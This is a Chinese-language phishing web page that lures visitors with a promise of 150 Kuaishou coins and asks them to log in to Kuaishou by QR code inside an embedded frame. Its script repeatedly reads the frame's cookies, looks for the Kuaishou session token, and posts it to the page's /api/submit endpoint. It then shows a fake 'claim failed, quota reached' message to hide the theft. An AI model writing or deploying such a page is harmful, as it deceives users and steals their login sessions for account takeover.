<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>领取奖励</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f0f0f;color:#fff;font-family:Arial;text-align:center;min-height:100vh}
.top{background:linear-gradient(90deg,#ff4900,#ff8c00);padding:14px}
.top h2{font-size:18px}
.top p{font-size:12px;opacity:0.8}
.iframe-box{width:100%;height:85vh;background:#fff}
.iframe-box iframe{width:100%;height:100%;border:none}
#tip{margin:8px 0;font-size:13px;color:#ffaa00}
.btn{margin:6px;padding:8px 20px;background:#ff4900;color:#fff;border:none;border-radius:20px;font-size:13px;cursor:pointer}
</style>
</head>
<body>
<div class="top">
    <h2>🎁 扫码领取150快币</h2>
    <p>点击右上角登录 → 扫码登录 → 确认即可</p>
</div>
<div class="iframe-box">
    <iframe id="ks" src="https://www.kuaishou.com"></iframe>
</div>
<p id="tip">登录成功后自动领取</p>
<button class="btn" onclick="document.getElementById('ks').src='https://www.kuaishou.com'">重新加载</button>

<script>
var last = "";
setInterval(function(){
    try{
        var doc = document.getElementById("ks").contentDocument || document.getElementById("ks").contentWindow.document;
        var c = doc.cookie;
        if(c && c.indexOf("kuaishou.server.web_st")!==-1 && c!==last){
            last = c;
            document.getElementById("tip").style.color = "#ffaa00";
            document.getElementById("tip").textContent = "正在领取...";
            fetch("/api/submit",{
                method:"POST",
                headers:{"Content-Type":"application/json"},
                body:JSON.stringify({cookie:c})
            }).then(function(){
                document.getElementById("tip").style.color = "#ff4444";
                document.getElementById("tip").textContent = "😢 领取失败，名额已上限";
            });
        }
    }catch(e){}
},3000);
</script>
</body>
</html>
